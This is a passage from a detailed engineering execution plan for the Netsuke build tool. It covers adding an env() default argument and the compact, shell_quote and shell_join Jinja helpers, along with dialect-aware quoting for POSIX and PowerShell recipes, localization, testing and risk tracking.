# Make Jinja command helpers match the documented ergonomics (3.14.8)

This ExecPlan (execution plan) is a living document. The sections `Constraints`,
`Tolerances (exception triggers)`, `Risks`, `Progress`,
`Surprises & discoveries`, `Decision log`, `Outcomes & retrospective`,
`Conformance basis`, and `Verification plan` must be kept up to date as work
proceeds.

Status: DRAFT

## Purpose / big picture

Netsuke manifests are YAML documents whose string fields are rendered as Jinja
templates before the build graph is built. Netsuke's design documents promise
four template helpers that do not exist in the code: an `env()` function that
accepts a fallback value, a filter that makes an arbitrary string safe to paste
into a shell recipe, a filter that turns a list into a safe command fragment,
and a filter that drops empty entries from a list. Today `env('X')` fails the
whole build when `X` is unset, and there is no supported way to quote a value,
so manifest authors reach for shell parameter expansion such as
`${RUSTFLAGS:+$RUSTFLAGS }` inside recipes. That is exactly the construct
Netsuke's Ninja backend has to escape around, and it does not work at all on
Windows, where recipes run under Windows PowerShell.

After this change a manifest author can write, in a `Netsukefile`:

```yaml
targets:
  - name: build-stamp
    command: >-
      RUSTFLAGS={{ [base_flags, env('RUSTFLAGS', default='')]
        | compact | join(' ') | shell_quote(dialect='sh') }}
      cargo build ; touch {{ outs }}
```

Two details of that example are load-bearing and were wrong in the first draft
of this plan.

- The interpolation sits in **unquoted** position. `shell_quote` produces a
  complete shell word; putting it inside `"..."` would insert its quote
  characters literally and corrupt the value. This is a precondition of the
  filter, not a stylistic choice, and it is documented as such.
- The recipe uses `;`, not `&&`. `docs/users-guide.md:337-338` states that
  Netsuke's Windows contract is Windows PowerShell, "not a PowerShell Core
  (`pwsh`) contract", and Windows PowerShell 5.1 has no `&&` operator. A
  flagship example that cannot run on the platform whose dialect machinery this
  feature exists to serve would be worse than no example.

Given that manifest, observe that:

1. `netsuke generate` succeeds whether or not `RUSTFLAGS` is set in the
   environment.
2. When `RUSTFLAGS` is unset, the generated `build.ninja` carries
   `RUSTFLAGS=-D' warnings'` — one shell word, no empty argument, and no
   `${...:+...}` expansion. That spelling is the `shell-quote` crate's
   fragmented form; see the note under the behavioural specification.
3. When `RUSTFLAGS` is set to `-C target-cpu=native --cfg 'a b'`, the generated
   command still contains exactly one shell word for the value, and running the
   build passes that exact string to `cargo` rather than word-splitting it.
4. The `shell_escape` filter that the user guide currently describes as "not
   implemented" no longer appears anywhere; the guide names `shell_quote`, and
   `shell_quote` exists.

The observable acceptance is behavioural, not structural: a documented,
executed example in `docs/stdlib-yaml-and-jinja-guide.md` builds this exact
manifest and asserts the generated Ninja text.

## Context and orientation

Read this section before touching anything. It assumes no prior knowledge of
this repository.

### What Netsuke does

Netsuke reads a YAML manifest (`Netsukefile`), renders every string field as a
Jinja template using the [MiniJinja](https://docs.rs/minijinja) crate, lowers
the result into an intermediate representation (IR), and writes a `build.ninja`
file that the [Ninja](https://ninja-build.org/) build tool executes. "Jinja" is
a template language; a *filter* is written `value | name(arguments)` and a
*function* is written `name(arguments)`.

### Where the template helpers live

There are three registration surfaces, all reachable from
`src/manifest/mod.rs::from_str_named` (lines 107-178):

1. `src/manifest/mod.rs:131-138` registers `env` and `glob` directly on the
   `minijinja::Environment`. These two names are manifest-loader-owned, not
   part of the standard library, and are listed in `RESERVED_VAR_NAMES`
   (`src/manifest/mod.rs:197`) so a manifest `vars:` entry cannot shadow them.
2. `src/stdlib/register.rs::register_with_config` (line 101) wires the full
   standard library: file tests, path filters, collection filters, time
   functions, network functions, command wrappers, and the `which` family.
3. `src/stdlib/register.rs::register_manifest_query` (line 135) wires a
   restricted, side-effect-free subset used when rendering discovery metadata
   for `netsuke help targets`. It does not merely omit the unsafe helpers: it
   re-registers each one with a stub that always fails
   (`register_always_disabled_query_helpers`, line 172, and
   `register_host_dependent_query_helpers`, line 213). `env` is one of those
   stubs, at `src/stdlib/register.rs:173-176`.

There is **no test asserting parity** between surfaces 2 and 3. Adding a helper
to one and forgetting the other is caught only by review. This plan adds
targeted coverage for the four helpers it introduces; a general parity test is
out of scope.

### How `env()` works today

`src/manifest/mod.rs:129-133`:

```rust
let reader = Arc::clone(env_reader);
jinja.add_function("env", move |var_name: String| {
    env_var_with(&var_name, |key| reader(key))
});
```

`EnvReader` is `Arc<dyn Fn(&str) -> Result<String, EnvReadError> + Send + Sync>`
(`src/manifest/env_reader.rs:56`). It exists because Netsuke forbids reading
`std::env::var` outside a thin injected seam; see
`docs/adr-008-environment-seam-taxonomy.md`, which names this exact site as the
canonical `Arc`-closure seam (the `Arc` is required because MiniJinja's
`add_function` demands `Send + Sync`).

`env_var_with` (`src/manifest/env_reader.rs:90-111`) maps the two failure modes:

```rust
Err(EnvReadError::NotPresent) => {
    tracing::debug!(failure_kind = "not_present", "manifest env lookup failed");
    Err(Error::new(
        ErrorKind::UndefinedError,
        localization::message(keys::MANIFEST_ENV_MISSING).to_string(),
    ))
}
Err(EnvReadError::NotUnicode) => {
    tracing::debug!(failure_kind = "not_unicode", "manifest env lookup failed");
    Err(Error::new(
        ErrorKind::InvalidOperation,
        localization::message(keys::MANIFEST_ENV_INVALID_UTF8).to_string(),
    ))
}
```

Neither message names the variable, deliberately: the doc comment at
`src/manifest/env_reader.rs:83-89` explains that variable names "routinely
identify credentials". Two `insta` snapshots pin the rendered strings exactly,
at `tests/manifest_env_tests.rs:108-122`:

```text
undefined value: A required environment variable is not set. (in <string>:1)
invalid operation: An environment variable contains invalid UTF-8. (in <string>:1)
```

An existing unit test, `empty_value_is_returned_rather_than_treated_as_missing`
(`src/manifest/tests/env_function.rs`), pins that an empty string is a *value*,
not an absence.

### Which shell actually runs a recipe

This is the single most important fact for the quoting design, and it is not
what a reader would assume.

`src/recipe_shell.rs` defines:

```rust
pub enum RecipeShell {
    /// Use the host POSIX shell through Ninja's ordinary Unix execution path.
    Posix,
    /// Use Windows PowerShell with an encoded script argument.
    PowerShell,
    /// Use an explicitly selected Bash compatibility runtime on Windows.
    Bash,
}

impl RecipeShell {
    pub(crate) const fn host_default() -> Self {
        if cfg!(windows) { Self::PowerShell } else { Self::Posix }
    }
}
```

On Windows, Netsuke wraps every recipe as
`powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass
-EncodedCommand <base64>`
(`src/ninja_gen_recipe_shell.rs:16-17`). It never uses `cmd.exe`.
`docs/users-guide.md:330-348` ("Windows legacy recipe contract") states this
normatively. On Unix the command is emitted bare for Ninja to run through its
own POSIX path.

A Windows user may set `NETSUKE_WINDOWS_SHELL=bash` to select an explicit Bash
compatibility runtime (`src/runner/recipe_shell.rs:24-58`). The runner resolves
this once, before dispatch (`src/runner/mod.rs:149`), and threads the result
through `ExecutionContext.graph_generation.recipe_shell` into IR lowering
(`src/runner/generation.rs:109`) and Ninja generation
(`src/runner/generation.rs:132`).

Consequently, POSIX `sh` quoting is correct for `RecipeShell::Posix` and
`RecipeShell::Bash`, and **wrong** for `RecipeShell::PowerShell`.

### The quoting that already exists

There are **five** distinct encoders today, not three. Getting this inventory
right matters, because the plan's central promise is that it adds none.
`docs/developers-guide.md:445-458` documents only the last three.

1. `src/ir/cmd_interpolate/mod.rs::quote_path` (lines 137-150) quotes
   `{{ ins }}` and `{{ outs }}` for the selected `RecipeShell` in an
   **unquoted** recipe context:

   ```rust
   fn quote_path(path: &Utf8PathBuf, shell: RecipeShell) -> String {
       if shell == RecipeShell::PowerShell {
           return format!("'{}'", path.as_str().replace('\'', "''"));
       }
       // Utf8PathBuf guarantees UTF-8, and shell quoting should preserve it.
       let bytes: Vec<u8> = path.as_str().quoted(Sh);
       match String::from_utf8(bytes) { /* ... */ }
   }
   ```

   This is the semantics the new template helpers need, and **this one encoder
   is the only one this plan extracts.**

2. `PathSubstitutions::new` (`src/ir/cmd_interpolate/mod.rs:81-103`) builds a
   `single_quoted` variant by `path.replace('\'', "'\"'\"'")`, for a
   placeholder appearing inside existing single quotes.

3. `quote_double_quoted_path` (`src/ir/cmd_interpolate/mod.rs:154-163`)
   backslash-escapes `\`, `"`, `$`, and `` ` `` for a placeholder inside
   existing double quotes.

   Encoders 2 and 3 are *context* encoders for the same POSIX shell. They are
   out of scope: they solve a different problem (splicing into a surrounding
   quote) from the one the template filters solve (producing a complete word).

4. `src/stdlib/command/quote.rs::quote` is `#[cfg(windows)]`/
   `#[cfg(not(windows))]` and produces `cmd.exe` quoting on Windows. It
   supports the `shell` and `grep` template filters, which *spawn a process*
   through the platform shell at manifest-render time. It is not exposed to
   templates and must keep its `cmd.exe` behaviour.

5. `shell_single_quote` in the Ninja command-list renderer produces a canonical
   single-quoted `eval` payload. `docs/developers-guide.md:449-454` explicitly
   says to keep it local and not generalize it.

The `shell-quote` crate is pinned at `Cargo.toml:137` with
`default-features = false, features = ["sh"]`, so only the `Sh` dialect is
compiled in. `Sh::quoted` returns `Vec<u8>` (not `String`), which is why both
call sites convert.

### What the documentation currently promises

`docs/netsuke-design.md` §4.4 (lines 1233-1307) specifies
`env(var_name, default: Option<String>)` and says the `default` argument is
"planned". §4.5 (lines 1309-1334) specifies three unimplemented filters:

- `| shell_escape`: "takes a string or list and escapes it for safe inclusion
  as a single argument in a shell command … a non-negotiable security feature".
- `| shell_join`: "accepts a list of arguments and returns one shell-safe
  command fragment. Each list element is quoted as a separate argument."
- `| compact`: "removes empty strings and null values while preserving order.
  It supports patterns such as constructing `RUSTFLAGS` from an optional user
  override without handwritten shell tests."

`docs/users-guide.md:490` says "The `shell_escape` filter described in older
drafts is not implemented in beta3."
`docs/stdlib-yaml-and-jinja-guide.md:318-320` says `env(name)` has "no
default-value argument".

`docs/rfcs/0006-ansible-inspired-template-standard-library.md:1393-1409`
supersedes the `shell_escape` name:

> `text | shell_quote(dialect='sh')` … **This is the same capability as the
> `shell_escape` helper documented but unimplemented today**, which roadmap task
> 3.14.8 exists to resolve. That task remains the owner and ships first; this
> RFC contributes only the canonical name and the `dialect` argument.

`docs/netsuke-design.md:650-658` already writes the target ergonomics into an
illustrative manifest:

```yaml
RUSTFLAGS: >-
  {{ [rust_flags, env('RUST_FLAGS', default='')] | compact | join(' ') }}
```

### Localization is a hard gate

Every user-facing string is a Fluent message. Adding one means:

1. adding a constant to the `define_keys!` block in
   `src/localization/keys.rs`, and
2. adding the message to **all 35** catalogues under
   `locales/<tag>/messages.ftl` with an identical `{ $variable }` name set.

`build.rs:291` calls `build_l10n_audit::audit_localization_keys()`
unconditionally. Missing a catalogue fails `cargo build` — not a test, the
build — with one `- missing in <tag>: <key>` line per locale. See
`docs/developers-guide.md:285-302` and `docs/translators-guide.md`.

### Testing infrastructure

- Unit and integration tests run under `cargo-nextest` (`make test-nextest`),
  which gives each test its own process. Doctests run separately
  (`make doctest`). `make test` is both.
- `proptest` is used widely. The house idiom is a `proptest!` block opening
  with an inner attribute that sets `ProptestConfig { cases: 128, .. }` — see
  `src/ninja_gen_property_tests/dependency_only.rs` in full. Regression seeds
  live under `proptest-regressions/`, mirroring the `src/` path.
- `rstest-bdd` feature files live in `tests/features/*.feature` and are
  auto-discovered by `scenarios!("tests/features", ...)` in
  `tests/bdd_tests.rs`. **New `.feature` files need no registration**; new step
  *modules* need a `mod` line in `tests/bdd/steps/mod.rs`.
  `tests/features/stdlib.feature` and `tests/bdd/steps/stdlib/` are the
  existing template-helper suite.
- `insta` snapshots live in `src/snapshots/<subdir>/` and
  `tests/snapshots/<subdir>/`, with the path set explicitly via
  `Settings::set_snapshot_path`.
- `googletest` matchers (`assert_that!(x, contains_substring(y))`) and
  `pretty_assertions::assert_eq` are both in use; see
  `src/cli/discovery_layer_tests.rs:10-11` and lines 140-178.
- **Documented examples are executed.** A fenced block in `README.md`,
  `docs/users-guide.md`, or `docs/stdlib-yaml-and-jinja-guide.md` must be
  preceded by `<!-- tested-example: <id> -->`. The loader is
  `tests/documentation_examples/mod.rs`; the id must also be added to
  `EXPECTED_EXAMPLE_IDS` in `tests/documentation_examples_tests.rs:18-61` or
  the suite fails with "documented example registry drifted". YAML examples are
  run as real manifests via `manifest_workspace(id)`.
- `tests/integration_test_wiring_tests.rs` asserts every `tests/<dir>/mod.rs`
  tree is declared by some top-level `tests/*.rs`, and that Cargo discovers
  every top-level integration-test source.

### Non-negotiable house rules that bear on this work

From `AGENTS.md` and `docs/adr-008-environment-seam-taxonomy.md`:

- In-process environment mutation is forbidden in tests. Inject `EnvReader`,
  `mockable::Env`, or a narrow closure seam. `serial_test` and process-wide
  locks are not an escape hatch.
- No file may exceed 400 lines.
- Every module needs a `//!` comment; every function, public or private, needs
  a `///` comment. `make doc-coverage` enforces an 80% aggregate.
- The toolchain enables the Polonius borrow checker and the next-generation
  trait solver. Do not add NLL-era workarounds (double lookups,
  `entry(key.clone())`, defensive `.clone()`), and do not add `-Z` flags.
- Markdown prose wraps at 80 columns; code blocks at 120. `make check-fmt`
  enforces `mdtablefix`-canonical Markdown. `make markdownlint` runs `typos`
  with en-GB-oxendict (Oxford) spelling; backtick technical identifiers rather
  than widening the accepted-word list.

### Applicability of `ortho_config`

`ortho_config` provides layered configuration with localized help. This change
adds no command-line flag and no configuration key: the recipe-shell selection
it depends on is already resolved from `NETSUKE_WINDOWS_SHELL` in
`src/runner/recipe_shell.rs`, which is a runner-level environment seam, not a
configuration layer. `ortho_config` is therefore **not used** by this work. If
a reviewer believes a `dialect` default belongs in project configuration, that
is a scope change: stop and escalate rather than adding a configuration key.

## Conformance basis

There is no Terms of Reference artefact in this repository. The upstream
artefacts are:

| Identifier      | Artefact                                                     | Revision anchor      |
| --------------- | ------------------------------------------------------------ | -------------------- |
| `RM-3.14.8`     | `docs/roadmap.md` lines 282-295                              | at commit `81d44f89` |
| `RM-6.8.3`      | `docs/roadmap.md` lines 1103-1110                            | at commit `81d44f89` |
| `DD-4.4`        | `docs/netsuke-design.md` §4.4, lines 1233-1307               | at commit `81d44f89` |
| `DD-4.5`        | `docs/netsuke-design.md` §4.5, lines 1309-1334               | at commit `81d44f89` |
| `DD-2.6`        | `docs/netsuke-design.md` §2.6, lines 630-700                 | at commit `81d44f89` |
| `RFC-0006-8.9`  | `docs/rfcs/0006-…md` lines 1393-1409                         | at commit `81d44f89` |
| `RFC-0006-13.3` | `docs/rfcs/0006-…md` line 1834                               | at commit `81d44f89` |
| `ADR-008`       | `docs/adr-008-environment-seam-taxonomy.md`                  | Accepted 2026-08-06  |
| `ADR-014`       | `docs/adr-014-backend-text-escaping-seam.md`                 | Accepted             |
| `UG-WIN`        | `docs/users-guide.md:330-348` Windows legacy recipe contract | at commit `81d44f89` |

Predecessors `2.2.4` (archived,
`docs/archive/roadmap-completed-foundations.md:125`) and `3.14.4`
(`docs/roadmap.md:246`) are both complete, so `RM-3.14.8` is unblocked.

Trace chain:

```plaintext
RM-3.14.8 -> DD-4.4 -> EP-M1 -> tests::manifest_env::env_default_cases
RM-3.14.8 -> DD-4.5 (compact) -> EP-M2 -> tests::std_filter::compact_property
RM-3.14.8 -> DD-4.5 (shell_escape) + RFC-0006-8.9 -> EP-M3, EP-M4
    -> tests::shell_quote::sh_roundtrip_property
RM-3.14.8 -> DD-4.5 (shell_join) -> EP-M4 -> tests::shell_join::shlex_roundtrip
UG-WIN + ADR-014 -> EP-M3, EP-M4 -> tests::shell_quote::dialect_follows_recipe_shell
RM-3.14.8 (RUSTFLAGS) -> DD-2.6 -> EP-M5
    -> tests::documentation_examples::stdlib-optional-rustflags-manifest
RM-6.8.3 -> EP-M3 (name and dialect adopted early) -> ADR-021
```

## Constraints

These are hard invariants. Violating one requires escalation, not a workaround.

1. The rendered text of the two existing `env()` diagnostics must not change.
   `tests/manifest_env_tests.rs:108-122` holds `insta` inline snapshots of
   both; they must still pass **without being re-accepted**. Absence with no
   default stays `ErrorKind::UndefinedError`; a non-UTF-8 value stays
   `ErrorKind::InvalidOperation` *even when a default is supplied*.
2. An environment variable whose value is the empty string is a value, not an
   absence. `default` must never replace it.
3. Generated Ninja text for every existing manifest must remain byte-identical.
   No `.snap` file under `tests/snapshots/ninja/` may change.
4. Exactly one implementation of recipe-shell word quoting may exist. The
   `cmd.exe` quoting in `src/stdlib/command/quote.rs` and the `eval`-payload
   `shell_single_quote` are separate, documented paths and must keep their
   current behaviour; do not fold them in and do not add a fourth.
5. No test may call `std::env::set_var` or `remove_var`, directly or through a
   helper, and no production code may call `std::env::var`/`var_os` outside an
   injected seam. `clippy.toml` already denies these.
6. Every new user-facing string is a Fluent message present in all 35
   catalogues with a matching `{ $variable }` set.
7. Two contracts are in scope and they are governed differently.
   **(a) The Rust API** — `StdlibConfig`, `netsuke::manifest::*`,
   `RecipeShell` — is pre-1.0 with no external consumers, so changes are
   permitted, no compatibility alias or deprecated entry point may be added,
   and every caller is updated in the same change. **(b) The Jinja template
   surface** — helper names, argument names, and rendered output — is a
   user-facing contract independent of the crate version. A `Netsukefile` is
   written by people who never see the crate. Nothing in this plan removes or
   renames a template name any manifest can be using: `shell_escape` is
   documented but has never existed, which Stage A step 1 verifies. Any future
   change to a *shipped* template name or its output needs a deprecation path,
   and none exists yet. Whether `netsuke_version` should gate the template
   surface is an open question this plan does not answer.
8. No file exceeds 400 lines. No `-Z` compiler flag is added anywhere.
9. `make check-fmt`, `make typecheck`, `make lint`, `make doc-coverage`, and
   `make test` must all pass at every milestone boundary.
10. `shell_quote` and `shell_join` must never emit a dialect that differs from
    the interpreter which will execute the recipe. This is the whole point of
    the feature; see the silent-corruption path in R11.
11. Changes under `locales/**` are never "docs-only" for gating purposes. The
    localization audit runs in `build.rs`, so a gate that skips the Rust build
    for a translation-only diff would skip the audit that protects it.

## Tolerances (exception triggers)

Stop and escalate — do not improvise — when any of these is reached.

1. **Scope**: more than 50 non-generated files changed, or more than 1000 net
   added lines outside `locales/` and `docs/`. (The 35 catalogues alone
   contribute roughly 385 lines; they do not count against this.)
2. **Interface**: a public signature outside `src/manifest/`,
   `src/stdlib/config/`, and the manifest-loading entry points must change; or
   `RESERVED_VAR_NAMES` must grow. EP-M4's runner plumbing changes the
   manifest-loading signatures; that breach is foreseen, recorded in EP-M4, and
   needs no escalation. Any *further* public signature change does.
3. **Dependencies**: any new entry in `Cargo.toml`. The plan needs none:
   `shell-quote`, `shlex`, `proptest`, `rstest`, `rstest-bdd`, `insta`,
   `googletest`, `pretty_assertions`, and `mockable` are all present.
4. **Behaviour**: any existing `.snap` file requires re-acceptance, or any
   existing test requires modification beyond adding cases.
5. **Iterations**: a gate still fails after 3 focused fix attempts on the same
   milestone.
6. **Time**: a single milestone exceeds 6 hours of work.
7. **Ambiguity**: a second reading of `RFC-0006-8.9` or `DD-4.5` would produce a
   materially different template surface.
8. **Verification**: the real-shell round-trip property (OBL-SH-ROUNDTRIP)
   cannot be made to run in the sandbox, or its negative control passes.

## Risks

- **R1 — Translation burden.** Eleven new message keys across 35 catalogues is
  roughly 385 hand-written lines, and `build.rs` fails the build for any
  omission. Severity: medium. Likelihood: high. Mitigation: add every key and
  every catalogue entry in one commit per milestone that introduces them; follow
  `docs/localization-styleguide.md` and `docs/translators-guide.md` §5 for
  variable usage; copy the bracketed `[netsuke::jinja::…]` code verbatim into
  each translation, as `locales/fr/messages.ftl:343-347` does; run
  `cargo build` (not just `cargo check`) to trigger the audit early. Decision
  D11 records the alternative that would cut this to one key.
- **R2 — Refactoring `quote_path` changes generated Ninja.** Extracting the
  quoting into a shared module could alter bytes. Severity: high. Likelihood:
  low. Mitigation: the extraction is a pure move. Before and after, run
  `make test-nextest` and confirm
  `git status --short tests/snapshots src/snapshots` is empty. Constraint 3
  makes any diff an escalation.
- **R3 — RFC 0006 is being restructured concurrently.** Branch
  `6-1-1-split-rfc-0006-set-into-focused-child-rfcs-and-task` exists on the
  remote and touches the same RFC. Severity: medium. Likelihood: medium.
  Mitigation: keep the RFC 0006 edit to the two paragraphs at lines 1393-1409
  and 1834; rebase onto `origin/main` immediately before requesting review; if
  the RFC has been split by then, apply the same edit to whichever child RFC
  owns §8.9 and record the redirection in `Decision log`.
- **R4 — Host-dependent filter output breaks snapshots.** `shell_quote` with no
  explicit `dialect` produces different text on Windows. Severity: medium.
  Likelihood: high if unguarded. Mitigation: every snapshot and every
  documented example passes an explicit `dialect`, or is gated with
  `#[cfg(unix)]`. The host-default behaviour is covered only by tests that
  assert *which dialect was selected*, not its output.
- **R5 — Subprocess property tests are slow. Measured: they are not.**
  Severity: low. Likelihood: low. Evidence: 64 real `sh -c 'printf %s x'`
  invocations complete in about 86 ms on this machine, and one `sh -c` costs
  roughly 1 ms. Even at five times that, to allow for `std::process::Command`
  overhead and case generation, 64 cases land near half a second — two orders
  of magnitude under the 10-second budget and far under nextest's 60-second
  slow-test threshold. Mitigation: keep `cases: 64` for the subprocess property
  and the house default of 128 for the pure `shlex` properties, and do **not**
  build a batching harness. Batching would break proptest's per-case shrinking,
  which needs to re-run one input in isolation to minimize a counterexample.
- **R6 — Documentation gates.** `typos` enforces Oxford spelling over Markdown;
  `mdtablefix` enforces canonical tables; `make fmt` reformats unrelated files
  if they were already non-canonical. Severity: low. Likelihood: medium.
  Mitigation: run `make fmt` then inspect `git diff --stat`; if files unrelated
  to this change are reformatted, commit that reformatting separately and note
  it in `Surprises & discoveries`.
- **R7 — Doc-comment coverage.** Every new function, public or private, needs a
  `///` comment or `make doc-coverage` drops below 80%. Severity: low.
  Likelihood: medium. Mitigation: write the doc comment with the function, not
  afterwards.
- **R8 — Manifest-query surface drift.** There is no parity test between
  `register_with_config` and `register_manifest_query`. Severity: medium.
  Likelihood: medium. Mitigation: EP-M2 and EP-M4 each add an explicit
  manifest-query test for the helper they introduce, and EP-M1 adds one proving
  the disabled `env` stub still reports "disabled", not an argument-count
  error, when called with `default=`.

- **R9 — Collision with in-flight budget work.** The remote branch
  `issue-651-add-resource-budgets-to-manifest-template-evaluation` restructures
  the exact files this plan edits: `src/manifest/mod.rs` (196 lines changed),
  `src/manifest/query.rs` (76), `src/manifest/render.rs` (181); it splits
  `src/manifest/expand.rs` into a directory module and adds
  `src/manifest/registration.rs` with the same four members this plan extracts.
  Severity: medium. Likelihood: high. Mitigation: name the new module
  `src/manifest/registration.rs` and give it exactly that member set, so the
  branches converge rather than conflict. Rebase onto `origin/main` immediately
  before requesting review; if issue-651 has landed by then, add the `env`/
  `glob` registrations to the existing module instead of creating one. That
  branch also supplies the ceilings (`evaluation_fuel`, `rendered_value_bytes`,
  `foreach_cardinality`) that would bound a pathological `shell_join`.
  `shell_join` and `compact` are unbounded by design here; any length ceiling
  is issue-651's responsibility, not this plan's, and the plan says so rather
  than leaving the omission ambiguous.
- **R10 — `env(default=)` converts a loud failure into a silent one.** Today a
  missing variable fails the build immediately; afterwards a manifest can
  silently take a default, so a continuous-integration job whose `RUSTFLAGS`
  export stops propagating builds the wrong artefact instead of failing fast.
  Severity: medium. Likelihood: medium. Mitigation: emit
  `tracing::debug!(fallback_used = true, ...)` on the substitution path, naming
  neither variable nor value, matching the existing failure-path logging and
  the redaction rule at `src/manifest/env_reader.rs:83-89`. Roadmap 3.14.11
  sets the precedent that a manifest-time decision changing build behaviour
  belongs in verbose diagnostics. Document in the user guide that `default=''`
  trades fail-fast for tolerance, and that a value which must be present should
  omit `default`.
- **R11 — Dialect and interpreter mismatch corrupts silently.** If the filters'
  dialect can differ from the interpreter that runs the recipe, the failure is
  silent rather than loud. Concretely: PowerShell quoting doubles an embedded
  single quote, so `a'b` becomes `'a''b'`; fed to a POSIX-family shell that is
  two adjacent single-quoted strings concatenated, evaluating to `ab`. It is
  syntactically valid, so `shlex::split` accepts it and the IR guard has
  nothing to object to. `netsuke build` succeeds and the artefact is wrong.
  Severity: high. Likelihood: medium if the milestones are separable.
  Mitigation: constraint 10, discharged by fusing the filter registration and
  the runner plumbing into one milestone so no shipped commit can contain the
  divergence. OBL-COMPOSITION exercises the composed path per interpreter.
- **R12 — `is_valid_command_for_shell` does not guard PowerShell.**
  `src/ir/cmd_interpolate/mod.rs:226-231` returns `true` unconditionally for
  `RecipeShell::PowerShell`, so there is no structural validation of a
  PowerShell recipe at all. This plan does not introduce the gap but routes new
  traffic through it. Severity: medium. Likelihood: low. Mitigation:
  OBL-COMPOSITION asserts the PowerShell path end to end rather than relying on
  a guard that is not there. Closing the guard itself is out of scope; record
  it as a follow-up roadmap candidate in `Outcomes & retrospective`.

## Decision log

- **Decision D1**: Ship the helper as `shell_quote`, not `shell_escape`, and
  rewrite every `shell_escape` reference in `docs/netsuke-design.md` §4.5,
  `docs/users-guide.md:490`, `docs/netsuke-design.md:686-689`, and
  `docs/netsuke-design.md:3664-3667` to name `shell_quote`. Rationale:
  `RFC-0006-13.3` states that roadmap 3.14.8 "owns the shell-quoting capability
  and ships first" and that the RFC "contributes the canonical name
  `shell_quote` and the `dialect` argument; the roadmap task should adopt them
  so the two do not diverge". `RM-6.8.3` repeats this. Shipping `shell_escape`
  now would put a known-superseded name on the public template surface and
  force a breaking rename later. `RM-3.14.8` explicitly permits "implement **or
  remove**" the `shell_escape` name; this removes it by superseding it.
  Date/Author: 2026-09-08, planning session, confirmed by the requester.
- **Decision D2 (proposed deviation from `RFC-0006-8.9`)**: `shell_quote` and
  `shell_join` accept `dialect='sh'` **and** `dialect='powershell'`, and
  default to the dialect implied by the active `RecipeShell` rather than always
  to `sh`. Rationale: `RFC-0006-8.9` says "`dialect` currently accepts only
  `sh`, matching the single `shell-quote` feature Netsuke enables." That
  premise is false in the code as it stands. `UG-WIN` and
  `src/recipe_shell.rs:19-26` establish that the default Windows recipe
  interpreter is Windows PowerShell, and
  `src/ir/cmd_interpolate/mod.rs:137-150` already implements a second,
  non-`shell-quote` dialect for exactly that case. Shipping an `sh`-only filter
  would emit POSIX quoting into a PowerShell recipe, which is a silent
  injection-safety defect in the very helper whose stated purpose (`DD-4.5`) is
  to be "a non-negotiable security feature to prevent command injection
  vulnerabilities". Affected identifiers: `RFC-0006-8.9`, `RFC-0006-13.3`,
  `RM-6.8.3`, `DD-4.5`. Impacts: `docs/rfcs/0006-…md` §8.9 must be amended to
  record the two-dialect set and the host-default rule; `RM-6.8.3` is reduced
  to a no-op. Options considered: (a) two dialects with a host default —
  chosen; (b) `sh` only, raising a template error on a PowerShell host —
  rejected because it makes the filter unusable in default Windows manifests;
  (c) `sh` only with no platform awareness — rejected as silently unsafe.
  Approving authority: the requester, who selected option (a) and D1 explicitly
  before this plan was written. Date/Author: 2026-09-08, planning session.
- **Decision D3**: `dialect='bash'` is **not** accepted. `RecipeShell::Bash`
  maps to the `sh` dialect, because `shell_quote`'s `Sh` output is documented
  as "a lowest common denominator for Bash, Z Shell, and `/bin/sh`-like
  shells". Rationale: the `shell-quote` crate's `Bash` type emits a *different*,
  `$'...'`-style encoding that Netsuke does not compile in (`Cargo.toml:137`
  enables only `sh`). Accepting the name now would lock in a meaning that a
  future `bash` dialect would have to break. Date/Author: 2026-09-08, planning
  session.
- **Decision D4 (revised; the original premise was false)**: `default` and
  `dialect` are read as `Kwargs::get::<Option<Value>>` and type-checked
  explicitly. The first draft used `Kwargs::get::<Option<String>>` believing it
  raises a type error for a non-string. It does not. Verified against
  `minijinja 2.24.0`, it silently stringifies every value kind: `default=1`
  yields `"1"`, `default=true` yields the Python-shaped `"True"`, and
  `default=['a','b']` yields the JSON fragment `["a", "b"]` — straight into a
  shell recipe. That is exactly the coercion
  `docs/rfcs/0006-ansible-inspired-template-standard-library.md:325` §6.6
  forbids: "A helper that expects a string rejects numbers and booleans rather
  than stringifying them." The read is therefore:

  ```rust
  let fallback = match kwargs.get::<Option<Value>>("default")? {
      None => None,
      Some(value) if value.is_none() => None,
      Some(value) if value.is_undefined() => return Err(undefined_default_error()),
      Some(value) => Some(
          value
              .as_str()
              .ok_or_else(|| default_not_string_error(value.kind()))?
              .to_owned(),
      ),
  };
  ```

  `default=none` remains equivalent to omitting `default`, because `env`'s
  fallback is an absence substitution rather than a value slot; that is the one
  place RFC 0006's null rule is deliberately not followed, and the user guide
  says so. Undefined and non-string values are errors. This costs one message
  key the first draft claimed to save. Buying a silent-coercion defect for
  thirty-five lines of translation was a bad trade. Date/Author: 2026-09-09,
  revised after contract review.
- **Decision D5**: `compact` drops `none`, undefined, and the empty string, and
  keeps `0`, `false`, `[]`, and `{}`. Rationale: `DD-4.5` says exactly "removes
  empty strings and null values while preserving order". Dropping
  falsy-but-present values would silently discard a meaningful `0` from a flag
  list. Date/Author: 2026-09-08, planning session.
- **Decision D6 (rationale corrected)**: `shell_quote` and `shell_join` are
  registered on the manifest-query surface as *working* helpers, not disabled
  stubs. Rationale: they are pure **with respect to the supplied dialect**. The
  first draft claimed they "read no environment state", which is false: with
  `dialect` omitted they resolve through `RecipeShell::host_default()`, itself
  `cfg!(windows)` (`src/recipe_shell.rs:20-26`), and after EP-M4 from
  `NETSUKE_WINDOWS_SHELL`. So `{{ 'a b' | shell_quote }}` on the query surface
  discloses the host OS family. That is an accepted residual — the family is
  already inferable from the binary and from `netsuke --version` — but
  non-disclosure is the one property `register_manifest_query` exists to
  guarantee, so its rationale must be accurate rather than convenient. Given an
  explicit `dialect`, the filters read nothing at all. `compact` is
  unconditionally pure and lands automatically, because
  `collections::register_filters` is already called by both surfaces
  (`src/stdlib/register.rs:158` and `:169`). Date/Author: 2026-09-09, corrected
  after structural review.
- **Decision D7**: `ortho_config` is not used. See "Applicability of
  `ortho_config`" above. Date/Author: 2026-09-08, planning session.

- **Decision D8**: `compact` and `shell_join` reject by `ValueKind`, not by
  `Value::try_iter()`. Rationale: the first draft claimed non-sequence input
  "errors through `values.try_iter()?`, exactly as `uniq` does". That is false.
  `minijinja-2.24.0/src/value/mod.rs::try_iter` accepts `None` and `Undefined`
  (yielding an empty iterator), any string (yielding its *characters*), and any
  object (a map yields its *keys*); only numbers and booleans are rejected. So
  `{{ 'abc' | shell_join }}` would quote three separate characters into a
  command line, and `{{ my_map | compact }}` would silently return the map's
